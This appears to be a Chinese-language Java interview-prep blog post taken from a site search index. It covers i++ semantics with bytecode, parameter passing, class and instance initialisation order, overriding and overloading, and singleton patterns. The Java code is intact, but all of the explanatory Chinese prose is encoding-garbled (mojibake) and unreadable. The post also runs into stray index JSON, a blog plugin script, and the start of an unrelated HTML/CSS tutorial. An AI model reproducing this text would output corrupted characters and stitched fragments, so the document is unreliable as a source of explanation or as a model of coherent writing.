åœ¨æ–‡ä¸­ä¹Ÿæåˆ°ï¼š è‡ªå¢è¿ç®—ç¬¦ ++ çš„ä¼˜å…ˆçº§å¤§äºèµ‹å€¼è¿ç®—ç¬¦ = The result of the postfix increment expression is not a variable, but a valueï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šå ++ ç¬¦è¡¨è¾¾å¼çš„ç»“æœæ˜¯ä¸ªå€¼è€Œä¸æ˜¯ä¸€ä¸ªå˜é‡ è¿›é˜¶æ¡ˆä¾‹ä»£ç ï¼š 123456789101112public class Test { public static void main(String[] args) { int i = 1; i = i++; int j = i++; int k = i + ++i * i++; System.out.println("i=" + i); // 4 System.out.println("j=" + j); // 1 System.out.println("k=" + k); // 11 }} â˜…å±•å¼€å®Œæ•´çš„ Java å­—èŠ‚ç â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758Compiled from "Test.java"public class Test { public Test(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object."&lt;init&gt;":()V 4: return public static void main(java.lang.String[]); Code: 0: iconst_1 1: istore_1 2: iload_1 3: iinc 1, 1 6: istore_1 7: iload_1 8: iinc 1, 1 11: istore_2 12: iload_1 13: iinc 1, 1 16: iload_1 17: iload_1 18: iinc 1, 1 21: imul 22: iadd 23: istore_3 24: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 27: new #3 // class java/lang/StringBuilder 30: dup 31: invokespecial #4 // Method java/lang/StringBuilder."&lt;init&gt;":()V 34: ldc #5 // String i= 36: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 39: iload_1 40: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 43: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 46: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 49: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 52: new #3 // class java/lang/StringBuilder 55: dup 56: invokespecial #4 // Method java/lang/StringBuilder."&lt;init&gt;":()V 59: ldc #10 // String j= 61: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 64: iload_2 65: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 68: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 71: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 74: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 77: new #3 // class java/lang/StringBuilder 80: dup 81: invokespecial #4 // Method java/lang/StringBuilder."&lt;init&gt;":()V 84: ldc #11 // String k= 86: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 89: iload_3 90: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 93: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 96: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 99: return} æ¡ˆä¾‹å°ç»“: èµ‹å€¼ = æœ€åè®¡ç®— = å³è¾¹çš„ä»å·¦åˆ°å³åŠ è½½å€¼ä¾æ¬¡å‹å…¥æ“ä½œæ•°æ ˆ å®é™…å…ˆç®—å“ªä¸ªï¼Œçœ‹è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ è‡ªå¢ã€è‡ªå‡æ“ä½œéƒ½æ˜¯ç›´æ¥ä¿®æ”¹å˜é‡çš„å€¼ï¼Œä¸ç»è¿‡æ“ä½œæ•°æ ˆ åœ¨æœ€åçš„èµ‹å€¼ä¹‹å‰ï¼Œä¸´æ—¶ç»“æœéƒ½æ˜¯å­˜å‚¨åœ¨æ“ä½œæ•°æ ˆä¸­ æ–¹æ³•å‚æ•°ä¼ é€’çŸ¥è¯†ç‚¹ï¼š å½¢å‚æ˜¯åŸºæœ¬æ•°æ®ç±»å‹æ—¶ ä¼ é€’æ•°æ®å€¼ å®å‚æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ ä¼ é€’åœ°å€å€¼ï¼šç±»å¯¹è±¡ç±»å‹ã€æ•°ç»„ ç‰¹æ®Šçš„ç±»å‹ï¼šStringã€åŒ…è£…ç±»ï¼ˆå¦‚ Integerï¼‰ç­‰å¯¹è±¡æ‹¥æœ‰ä¸å¯å˜æ€§ ä»£ç æ¡ˆä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637public class Example { public static void main(String[] args) { int i = 1; String str = "hello"; Integer num = 200; int[] arr = { 1, 2, 3, 4, 5 }; MyData my = new MyData(); change(i, str, num, arr, my); System.out.println("i = " + i); System.out.println("str = " + str); System.out.println("num = " + num); System.out.println("arr = " + Arrays.toString(arr)); System.out.println("my.a = " + my.a); // è¿è¡Œç»“æœ // i = 1 // str = hello // num = 200 // arr = [2, 2, 3, 4, 5] // my.a = 11 } public static void change(int j, String s, Integer n, int[] a, MyData data) { j += 1; s += "world"; n += 1; a[0] += 1; data.a += 1; }}class MyData { int a = 10;} åˆ†æè¿‡ç¨‹ï¼š ç‚¹å‡»æˆªå›¾æŸ¥çœ‹åˆ†æè¿‡ç¨‹ ç±»ä¸å®ä¾‹åˆå§‹åŒ–ç±»åˆå§‹åŒ–ç±»çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š ä¸€ä¸ªç±»è¦åˆ›å»ºå®ä¾‹éœ€è¦å…ˆåŠ è½½å¹¶åˆå§‹åŒ–è¯¥ç±»ï¼ˆmain æ–¹æ³•æ‰€åœ¨çš„ç±»éœ€è¦å…ˆåŠ è½½å’Œåˆå§‹åŒ–ï¼‰ ä¸€ä¸ªå­ç±»è¦åˆå§‹åŒ–éœ€è¦å…ˆåˆå§‹åŒ–çˆ¶ç±» ä¸€ä¸ªç±»åˆå§‹åŒ–ï¼Œæœ¬è´¨å°±æ˜¯æ‰§è¡Œ &lt;clinit&gt;() æ–¹æ³• &lt;clinit&gt;() æ–¹æ³•ç”±é™æ€ç±»å˜é‡èµ‹å€¼ä»£ç å’Œé™æ€ä»£ç å—ç»„æˆ é™æ€ç±»å˜é‡èµ‹å€¼ä»£ç å’Œé™æ€ä»£ç å—ä»£ç ä»ä¸Šåˆ°ä¸‹é¡ºåºæ‰§è¡Œ &lt;clinit&gt;() æ–¹æ³•åªä¼šæ‰§è¡Œä¸€æ¬¡ å®ä¾‹åˆå§‹åŒ–å®ä¾‹çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š å®ä¾‹åˆå§‹åŒ–ï¼Œæœ¬è´¨å°±æ˜¯æ‰§è¡Œ &lt;init&gt;() æ–¹æ³•ï¼š &lt;init&gt;() æ–¹æ³•å¯èƒ½é‡è½½æœ‰å¤šä¸ªï¼Œæœ‰å‡ ä¸ªæ„é€ å™¨å°±æœ‰å‡ ä¸ª &lt;init&gt;() æ–¹æ³• &lt;init&gt;() æ–¹æ³•ç”±éé™æ€å®ä¾‹å˜é‡èµ‹å€¼ä»£ç å’Œéé™æ€ä»£ç å—ã€å¯¹åº”æ„é€ å™¨ä»£ç ç»„æˆ éé™æ€å®ä¾‹å˜é‡èµ‹å€¼ä»£ç å’Œéé™æ€ä»£ç å—ä»£ç ä»ä¸Šåˆ°ä¸‹é¡ºåºæ‰§è¡Œï¼Œè€Œæ„é€ å™¨çš„ä»£ç æ°¸è¿œæœ€åæ‰§è¡Œ æ¯æ¬¡åˆ›å»ºå®ä¾‹å¯¹è±¡ï¼Œè°ƒç”¨å¯¹åº”æ„é€ å™¨ï¼Œæ‰§è¡Œçš„å°±æ˜¯å¯¹åº”çš„ &lt;init&gt;() æ–¹æ³• &lt;init&gt; æ–¹æ³•çš„é¦–è¡Œæ˜¯ super() æˆ– super(å®å‚åˆ—è¡¨)ï¼Œå³å¯¹åº”çˆ¶ç±»çš„ &lt;init&gt; æ–¹æ³• é‡å†™ä¸é‡è½½ ä¸¤è€…çš„åŒºåˆ«ï¼š é‡å†™ï¼ˆOverrideï¼‰ä¹Ÿç§°è¦†ç›–ï¼Œå®ƒæ˜¯çˆ¶ç±»ä¸å­ç±»ä¹‹é—´å¤šæ€æ€§çš„ä¸€ç§è¡¨ç°ï¼Œè€Œé‡è½½ï¼ˆOverloadï¼‰æ˜¯ä¸€ä¸ªç±»ä¸­å¤šæ€æ€§çš„ä¸€ç§è¡¨ç° é‡å†™ï¼ˆOverride å®ƒæ˜¯è¦†ç›–äº†çˆ¶ç±»çš„ä¸€ä¸ªæ–¹æ³•å¹¶ä¸”å¯¹å…¶é‡å†™ï¼Œä»¥æ±‚è¾¾åˆ°ä¸åŒä½œç”¨ é‡è½½ï¼ˆOverloadï¼‰å®ƒæ˜¯æŒ‡å®šä¹‰ä¸€äº›åç§°ç›¸åŒçš„æ–¹æ³•ï¼Œé€šè¿‡å®šä¹‰ä¸åŒçš„è¾“å…¥å‚æ•°æ¥åŒºåˆ†è¿™äº›æ–¹æ³• é‡å†™ï¼ˆOverrideï¼‰çš„è§„åˆ™ å‚æ•°åˆ—è¡¨å¿…é¡»ä¸è¢«é‡å†™æ–¹æ³•çš„ç›¸åŒ éæŠ½è±¡å­ç±»ä¸­å¿…é¡»é‡å†™çˆ¶ç±»ä¸­çš„ abstract æ–¹æ³• è®¿é—®ä¿®é¥°ç¬¦çš„é™åˆ¶ä¸€å®šä¸èƒ½ä¸å°äºè¢«é‡å†™æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦ ä¸èƒ½é‡å†™è¢«æ ‡è¯†ä¸º finalã€privateã€static çš„æ–¹æ³•ï¼ˆå­ç±»ä¸­ä¸å¯è§çš„æ–¹æ³•ï¼‰ å­ç±»ç›´æ¥å†å†™ä¸€ä¸ªåŒåçš„æ–¹æ³•ï¼Œè¿™å¹¶ä¸æ˜¯å¯¹çˆ¶ç±»æ–¹æ³•è¿›è¡Œé‡å†™ï¼ˆOverrideï¼‰ï¼Œè€Œæ˜¯é‡æ–°ç”Ÿæˆä¸€ä¸ªæ–°çš„æ–¹æ³• é‡å†™çš„æ–¹æ³•ä¸èƒ½æŠ›å‡ºæ–°çš„å¼‚å¸¸ï¼Œæˆ–è€…è¶…è¿‡äº†çˆ¶ç±»èŒƒå›´çš„å¼‚å¸¸ï¼Œä½†æ˜¯å¯ä»¥æŠ›å‡ºæ›´å°‘ã€æ›´æœ‰é™çš„å¼‚å¸¸ï¼Œæˆ–è€…ä¸æŠ›å‡ºå¼‚å¸¸ é‡è½½ï¼ˆOverloadï¼‰çš„è§„åˆ™ï¼š é‡è½½æ˜¯é’ˆå¯¹äºä¸€ä¸ªç±»è€Œè¨€çš„ ä¸èƒ½é‡è½½åªæœ‰è¿”å›å€¼ä¸åŒçš„æ–¹æ³• æ–¹æ³•çš„å¼‚å¸¸ç±»å‹å’Œæ•°ç›®ä¸ä¼šå¯¹é‡è½½é€ æˆå½±å“ ä¸èƒ½é€šè¿‡è®¿é—®æƒé™ã€è¿”å›ç±»å‹ã€æŠ›å‡ºçš„å¼‚å¸¸è¿›è¡Œé‡è½½ ä¸è¢«é‡è½½çš„æ–¹æ³•æ¯”è¾ƒï¼Œå‚æ•°çš„ç±»å‹ã€ä¸ªæ•°ã€é¡ºåºè‡³å°‘æœ‰ä¸€ä¸ªä¸ç›¸åŒ å¯¹è±¡çš„å¤šæ€æ€§ éé™æ€æ–¹æ³•é»˜è®¤çš„è°ƒç”¨å¯¹è±¡æ˜¯ this this å¯¹è±¡åœ¨æ„é€ å™¨æˆ–è€…è¯´ &lt;init&gt;() æ–¹æ³•ä¸­å°±æ˜¯æ­£åœ¨åˆ›å»ºçš„å¯¹è±¡ å­ç±»å¦‚æœé‡å†™äº†çˆ¶ç±»çš„æ–¹æ³•ï¼Œé€šè¿‡å­ç±»å¯¹è±¡è°ƒç”¨çš„ä¸€å®šæ˜¯å­ç±»é‡å†™è¿‡çš„ä»£ç  é¢è¯•æ¡ˆä¾‹åˆ†æé—®ç­”äº’åŠ¨ï¼š ä¸ºä»€ä¹ˆåœ¨å®ä¾‹åŒ–å­ç±»çš„å¯¹è±¡æ—¶ï¼Œä¼šå…ˆè°ƒç”¨çˆ¶ç±»çš„æ„é€ å™¨ï¼Ÿ å­ç±»ç»§æ‰¿çˆ¶ç±»åï¼Œè·å–åˆ°çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™äº›å±æ€§å’Œæ–¹æ³•åœ¨ä½¿ç”¨å‰å¿…é¡»å…ˆåˆå§‹åŒ–ï¼Œæ‰€ä»¥é¡»å…ˆè°ƒç”¨çˆ¶ç±»çš„æ„é€ å™¨è¿›è¡Œåˆå§‹åŒ– åœ¨å“ªé‡Œè°ƒç”¨çˆ¶ç±»çš„æ„é€ å™¨ï¼Ÿ çˆ¶ç±»çš„æ„é€ å™¨æ˜¯ä¸èƒ½è¢«ç»§æ‰¿çš„ï¼Œä½†å¯ä»¥ç”¨ super() æ¥è°ƒç”¨ åœ¨å­ç±»æ„é€ å™¨çš„ç¬¬ä¸€è¡Œä¼šéšå¼çš„è°ƒç”¨ super()ï¼Œå³è°ƒç”¨çˆ¶ç±»çš„é»˜è®¤æ— å‚æ„é€ å™¨ å¦‚æœçˆ¶ç±»ä¸­æ²¡æœ‰å®šä¹‰æ— å‚çš„æ„é€ å™¨ï¼Œåˆ™å¿…é¡»åœ¨å­ç±»çš„æ„é€ å™¨çš„ç¬¬ä¸€è¡Œæ˜¾å¼åœ°è°ƒç”¨ super(å‚æ•°) ï¼Œä»¥æ­¤è°ƒç”¨çˆ¶ç±»ä¸­çš„æœ‰å‚æ„é€ å™¨ ä»£ç æ¡ˆä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243public class Father { private int i = test(); private static int j = method(); static { System.out.print("(1)"); } public Father() { System.out.print("(2)"); } { System.out.print("(3)"); } public int test() { System.out.print("(4)"); return 1; } public static int method() { System.out.print("(5)"); return 1; } public static void main(String[] args) { Father f1 = new Father(); System.out.println(); Father f2 = new Father(); } // è¿è¡Œç»“æœï¼š // (5)(1)(4)(3)(2) // (4)(3)(2) // åˆ†æç»“æœï¼š // é™æ€ç±»å˜é‡èµ‹å€¼ä»£ç å’Œé™æ€ä»£ç å—ä»£ç ä»ä¸Šåˆ°ä¸‹é¡ºåºæ‰§è¡Œ (5)(1) // éé™æ€å®ä¾‹å˜é‡èµ‹å€¼ä»£ç å’Œéé™æ€ä»£ç å—ä»£ç ä»ä¸Šåˆ°ä¸‹é¡ºåºæ‰§è¡Œ (4)(3) // æ„é€ å™¨çš„ä»£ç æ°¸è¿œæœ€åæ‰§è¡Œ (2) // ç”±äºåˆ›å»ºäº†ä¸¤ä¸ª Father å¯¹è±¡ï¼Œå› æ­¤å®ä¾‹åŒ–æ–¹æ³• &lt;init&gt;() æ‰§è¡Œäº†ä¸¤æ¬¡ (4)(3)(2)} 12345678910111213141516public class Son extends Father{ public Son() { } public static void main(String[] args){ Son test = new Son(); } // è¿è¡Œç»“æœï¼š // (5)(1)(4)(3)(2) // åˆ†æè¿‡ç¨‹ï¼š // å®ä¾‹åŒ–å­ç±»çš„å¯¹è±¡æ—¶ï¼Œé»˜è®¤ä¼šå…ˆé€šè¿‡ super() è°ƒç”¨çˆ¶ç±»çš„æ„é€ å™¨æ–¹æ³•ï¼Œå³å…ˆåˆ›å»ºçˆ¶ç±»å¯¹è±¡} 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class Son extends Father { private int i = test(); private static int j = method(); static { System.out.print("(6)"); } public Son() { System.out.print("(7)"); } { System.out.print("(8)"); } public int test() { System.out.print("(9)"); return 1; } public static int method() { System.out.print("(10)"); return 1; } public static void main(String[] args) { Son s1 = new Son(); System.out.println(); Son s2 = new Son(); } // è¿è¡Œç»“æœï¼š // (5)(1)(10)(6)(9)(3)(2)(9)(8)(7) // (9)(3)(2)(9)(8)(7) // åˆ†æè¿‡ç¨‹ï¼š // åˆå§‹åŒ–çˆ¶ç±»å’Œå­ç±»ï¼š // 1) å…ˆåˆå§‹åŒ–çˆ¶ç±»ï¼š(5)(1) // 2) åˆå§‹åŒ–å­ç±»ï¼š(10)(6) // è°ƒç”¨å­ç±»çš„å®ä¾‹åŒ–æ–¹æ³• &lt;init&gt;()ï¼š // 1) super()ï¼ŒæœŸé—´è°ƒç”¨äº†å­ç±»ä¸­è¢«é‡å†™çš„ test() æ–¹æ³• (9)(3)(2) // 2) i= test() (9) // 3) å­ç±»çš„éé™æ€ä»£ç  (8) // 4) å­ç±»çš„æ— å‚æ„é€ æ–¹æ³• (7) // ç”±äºåˆ›å»ºäº†ä¸¤ä¸ª Son å¯¹è±¡ï¼Œå› æ­¤å®ä¾‹åŒ–æ–¹æ³• &lt;init&gt;() æ‰§è¡Œäº†ä¸¤æ¬¡ // (9)(3)(2)(9)(8)(7)} å±€éƒ¨å˜é‡ä¸æˆå‘˜å˜é‡çŸ¥è¯†ç‚¹ï¼š å°±è¿‘åŸåˆ™ å˜é‡çš„åˆ†ç±» å±€éƒ¨å˜é‡ æˆå‘˜å˜é‡ï¼šåŒ…æ‹¬ç±»å˜é‡ã€å®ä¾‹å˜é‡ å±€éƒ¨å˜é‡ä¸æˆå‘˜å˜é‡çš„åŒºåˆ« å£°æ˜çš„åœ°æ–¹ å±€éƒ¨å˜é‡å£°æ˜çš„åœ°æ–¹ï¼šæ–¹æ³•ä½“ {} ä¸­ã€å½¢å‚ã€ä»£ç å— {} ä¸­ æˆå‘˜å˜é‡å£°æ˜çš„åœ°æ–¹ï¼šç±»ä¸­æ–¹æ³•å¤– ç±»å˜é‡ï¼šæœ‰ static ä¿®é¥° å®ä¾‹å˜é‡ï¼šæ²¡æœ‰ static ä¿®é¥° ä¿®é¥°ç¬¦çš„ä½¿ç”¨ å±€éƒ¨å˜é‡ï¼šfinal æˆå‘˜å˜é‡ï¼špublicã€protectedã€privateã€finalã€staticã€volatileã€transient å€¼å­˜å‚¨çš„ä½ç½® å±€éƒ¨å˜é‡ï¼šæ ˆ æˆå‘˜å˜é‡ ç±»å˜é‡ï¼šæ–¹æ³•åŒº å®ä¾‹å˜é‡ï¼šå † ä½œç”¨åŸŸ å±€éƒ¨å˜é‡ï¼šä»å£°æ˜å¤„å¼€å§‹ï¼Œåˆ°æ‰€å±çš„ } ç»“æŸ æˆå‘˜å˜é‡ ç±»å˜é‡ï¼šåœ¨å½“å‰ç±»ä¸­é€šè¿‡ ç±»å. è®¿é—®ï¼Œåœ¨å…¶ä»–ç±»ä¸­é€šè¿‡ ç±»å. æˆ–è€… å¯¹è±¡å. è®¿é—® å®ä¾‹å˜é‡ï¼šåœ¨å½“å‰ç±»ä¸­é€šè¿‡ this.ï¼Œåœ¨å…¶ä»–ç±»ä¸­é€šè¿‡ å¯¹è±¡å. è®¿é—® ç”Ÿå‘½å‘¨æœŸ å±€éƒ¨å˜é‡ï¼šæ¯ä¸€ä¸ªçº¿ç¨‹ï¼Œæ¯ä¸€æ¬¡è°ƒç”¨æ‰§è¡Œéƒ½æ˜¯æ–°çš„ç”Ÿå‘½å‘¨æœŸ æˆå‘˜å˜é‡ ç±»å˜é‡ï¼šéšç€ç±»çš„åˆå§‹åŒ–è€Œåˆå§‹åŒ–ï¼Œéšç€ç±»çš„å¸è½½è€Œæ¶ˆäº¡ï¼Œè¯¥ç±»çš„æ‰€æœ‰å¯¹è±¡çš„ç±»å˜é‡æ˜¯å…±äº«çš„ å®ä¾‹å˜é‡ï¼šéšç€å¯¹è±¡çš„åˆ›å»ºè€Œåˆå§‹åŒ–ï¼Œéšç€å¯¹è±¡çš„è¢«å›æ”¶è€Œæ¶ˆäº¡ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡çš„å®ä¾‹å˜é‡éƒ½æ˜¯äº’ç›¸ç‹¬ç«‹çš„ å½“å±€éƒ¨å˜é‡ä¸æˆå‘˜å˜é‡é‡åæ—¶ï¼Œå¦‚ä½•åŒºåˆ†ï¼Ÿ å±€éƒ¨å˜é‡ä¸ç±»å˜é‡é‡åï¼šåœ¨ç±»å˜é‡å‰åŠ  ç±»å. å±€éƒ¨å˜é‡ä¸å®ä¾‹å˜é‡é‡åï¼šåœ¨å®ä¾‹å˜é‡å‰åŠ  this. éé™æ€ä»£ç å—çš„æ‰§è¡Œï¼šæ¯æ¬¡åˆ›å»ºå®ä¾‹å¯¹è±¡æ—¶éƒ½ä¼šæ‰§è¡Œ ä»£ç æ¡ˆä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334public class Example { static int s; int i; int j; { int i = 1; i++; j++; s++; } public void test(int j) { i++; j++; s++; } public static void main(String[] args) { Example obj1 = new Example(); Example obj2 = new Example(); obj1.test(10); obj1.test(20); obj2.test(30); System.out.println(obj1.i + ", " + obj1.j + ", " + obj1.s); System.out.println(obj2.i + ", " + obj2.j + ", " + obj2.s); // è¿è¡Œç»“æœï¼š // 2, 1, 5 // 1, 1, 5 }} åˆ†æè¿‡ç¨‹ï¼š ç‚¹å‡»æˆªå›¾æŸ¥çœ‹åˆ†æè¿‡ç¨‹ è®¾è®¡æ¨¡å¼å•ä¾‹æ¨¡å¼çŸ¥è¯†ç‚¹ï¼š å•ä¾‹çš„ç‰¹ç‚¹ ä¸€æ˜¯æŸä¸ªç±»åªèƒ½æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå³æ„é€ å™¨ç§æœ‰åŒ– äºŒæ˜¯å¿…é¡»è‡ªè¡Œåˆ›å»ºè¿™ä¸ªå®ä¾‹ï¼Œå³å«æœ‰ä¸€ä¸ªè¯¥ç±»çš„é™æ€å˜é‡æ¥ä¿å­˜å”¯ä¸€çš„å®ä¾‹ ä¸‰æ˜¯å¿…é¡»è‡ªè¡Œå‘æ•´ä¸ªç³»ç»Ÿæä¾›è¿™ä¸ªå®ä¾‹ï¼Œå¯¹å¤–æä¾›è·å–å®ä¾‹å¯¹è±¡çš„æ–¹å¼ä¸€èˆ¬æ˜¯ï¼šç›´æ¥é€šè¿‡é™æ€å˜é‡æš´éœ²æˆ–è€…ä½¿ç”¨é™æ€ Get æ–¹æ³•æ¥è·å– å•ä¾‹æ¨¡å¼å¸¸è§çš„å‡ ç§å½¢å¼ï¼š é¥¿æ±‰å¼ï¼ˆåœ¨ç±»åˆå§‹åŒ–æ—¶ï¼Œç›´æ¥åˆ›å»ºå¯¹è±¡ï¼Œä¸å­˜åœ¨çº¿ç¨‹å®‰å…¨çš„é—®é¢˜ï¼‰ ç›´æ¥å®ä¾‹åŒ–é¥¿æ±‰å¼ï¼ˆç®€æ´ç›´è§‚ï¼‰ æšä¸¾å¼ï¼ˆæœ€ç®€æ´ï¼‰ é™æ€ä»£ç å—é¥¿æ±‰å¼ï¼ˆé€‚åˆå¤æ‚çš„å®ä¾‹åŒ–ï¼‰ æ‡’æ±‰å¼ï¼ˆå»¶è¿Ÿåˆ›å»ºå¯¹è±¡ï¼Œå¯èƒ½å­˜åœ¨çº¿ç¨‹å®‰å…¨çš„é—®é¢˜ï¼‰ çº¿ç¨‹ä¸å®‰å…¨ï¼ˆé€‚ç”¨äºå•çº¿ç¨‹ï¼‰ çº¿ç¨‹å®‰å…¨ï¼ˆé€‚ç”¨äºå¤šçº¿ç¨‹ï¼‰ é™æ€å†…éƒ¨ç±»å½¢å¼ï¼ˆé€‚ç”¨äºå¤šçº¿ç¨‹ï¼‰ é¥¿æ±‰å¼ä»£ç æ¡ˆä¾‹ï¼š 1234567891011/** * é¥¿æ±‰å¼ - ç›´æ¥å®ä¾‹åŒ–é¥¿æ±‰å¼ï¼ˆç®€æ´ç›´è§‚ï¼‰ */public class HungrySingleton { public static final HungrySingleton INSTANCE = new HungrySingleton(); private HungrySingleton() { }} 123456/** * é¥¿æ±‰å¼ - æšä¸¾å¼ï¼ˆæœ€ç®€æ´ï¼‰ */public enum HungrySingleton { INSTANCE} 12345678910111213141516/** * é¥¿æ±‰å¼ - é™æ€ä»£ç å—é¥¿æ±‰å¼ï¼ˆé€‚åˆå¤æ‚çš„å®ä¾‹åŒ–ï¼‰ */public class HungrySingleton { public static final HungrySingleton INSTANCE; static { // do anything INSTANCE = new HungrySingleton(); } private HungrySingleton() { }} æ‡’æ±‰å¼ä»£ç æ¡ˆä¾‹ï¼š 123456789101112131415161718/** * æ‡’æ±‰å¼ - çº¿ç¨‹ä¸å®‰å…¨ï¼ˆé€‚ç”¨äºå•çº¿ç¨‹ï¼‰ */public class LazySingleton01 { private static LazySingleton01 instance; private LazySingleton01() { } public static LazySingleton01 getInstance() { if (instance == null) { instance = new LazySingleton01(); } return instance; }} 12345678910111213141516171819202122232425/** * æ‡’æ±‰å¼ - DCLï¼ˆåŒç«¯æ£€é”ï¼‰ï¼Œé€‚ç”¨äºå¤šçº¿ç¨‹ * 1) DCLï¼ˆåŒç«¯æ£€é”ï¼‰æœºåˆ¶ä¸ä¸€å®šæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ŒåŸå› æ˜¯æœ‰æŒ‡ä»¤é‡æ’åºçš„å­˜åœ¨ï¼ŒåŠ å…¥volatileå¯ä»¥ç¦æ­¢æŒ‡ä»¤é‡æ’ * 2) åŸå› åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼ŒæŸä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œåˆ°ç¬¬ä¸€ä¸ªæ£€æµ‹ï¼Œè¯»å–åˆ°çš„instanceä¸ä¸ºnullæ—¶ï¼Œinstanceçš„å¼•ç”¨å¯¹è±¡å¯èƒ½æ²¡æœ‰å®Œæˆåˆå§‹åŒ– * 3) æŒ‡ä»¤é‡æ’åªä¼šä¿è¯ä¸²è¡Œè¯­ä¹‰çš„æ‰§è¡Œä¸€è‡´æ€§ï¼ˆå•çº¿ç¨‹ï¼‰ï¼Œä½†å¹¶ä¸ä¼šå…³å¿ƒå¤šçº¿ç¨‹é—´çš„è¯­ä¹‰ä¸€è‡´æ€§ã€‚æ‰€ä»¥å½“ä¸€æ¡çº¿ç¨‹è®¿é—®instanceä¸ä¸ºnullæ—¶ï¼Œç”±äºinstanceå®ä¾‹æœªå¿…å·²åˆå§‹åŒ–å®Œæˆï¼Œä¹Ÿå°±é€ æˆäº†çº¿ç¨‹å®‰å…¨é—®é¢˜ */public class LazySingleton02 { private static volatile LazySingleton02 instance; private LazySingleton02() { } public static LazySingleton02 getInstance() { if (instance == null) { synchronized (LazySingleton02.class) { if (instance == null) { instance = new LazySingleton02(); } } } return instance; }} 12345678910111213141516171819/** * æ‡’æ±‰å¼ - é™æ€å†…éƒ¨ç±»å½¢å¼ï¼ˆé€‚ç”¨äºå¤šçº¿ç¨‹ï¼‰ * 1ï¼‰é™æ€å†…éƒ¨ç±»ä¸ä¼šè‡ªåŠ¨éšç€å¤–éƒ¨ç±»çš„åŠ è½½å’Œåˆå§‹åŒ–è€Œåˆå§‹åŒ–ï¼Œå®ƒæ˜¯å•ç‹¬å»åŠ è½½å’Œåˆå§‹åŒ–çš„ * 2ï¼‰å› ä¸ºæ˜¯åœ¨é™æ€å†…éƒ¨ç±»åŠ è½½å’Œåˆå§‹åŒ–æ—¶ï¼Œæ‰åˆ›å»ºå•ä¾‹å¯¹è±¡ï¼Œå› æ­¤æ˜¯çº¿ç¨‹å®‰å…¨çš„ */public class LazySingleton03 { private LazySingleton03() { } public static LazySingleton03 getInstance() { return Singleton.instance; } private static class Singleton { private static final LazySingleton03 instance = new LazySingleton03(); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"å‰ç«¯å…¥é—¨åŸºç¡€ä¹‹ HTML ä¸ CSS ä¹‹å››",url:"/posts/9ff6bfd2.html",text:'CSS åŸºç¡€æ¨ªå‘å¸ƒå±€è¡Œå†…å—æ¨ªå‘å¸ƒå±€çš„é—®é¢˜ ä»£ç æ¢è¡Œä¼šé€ æˆå…ƒç´ ä¹‹é—´æœ‰é»˜è®¤é—´è· è¡Œå†…å—æ˜¯æ²¿åŸºçº¿å¯¹é½ï¼ˆåº•éƒ¨å¯¹é½ï¼‰ï¼Œå…·ä½“è¡¨ç°ä¸ºå½“ç»™å…ƒç´ è®¾ç½®å‚ç›´æ–¹å‘çš„å†…å¤–è¾¹è·æ—¶ï¼Œä¼šå½±å“å‘¨å›´çš„å…ƒç´  123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;è¡Œå†…å—æ¨ªå‘å¸ƒå±€çš„é—®é¢˜&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } body { margin: 300px; } .one { width: 50px; height: 50px; padding: 100px; /* margin: 100px; */ background: red; display: inline-block; } .two { width: 100px; height: 100px; background: green; display: inline-block; } .three { width: 150px; height: 150px; background: blue; display: inline-block; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt;&lt;/body&gt; 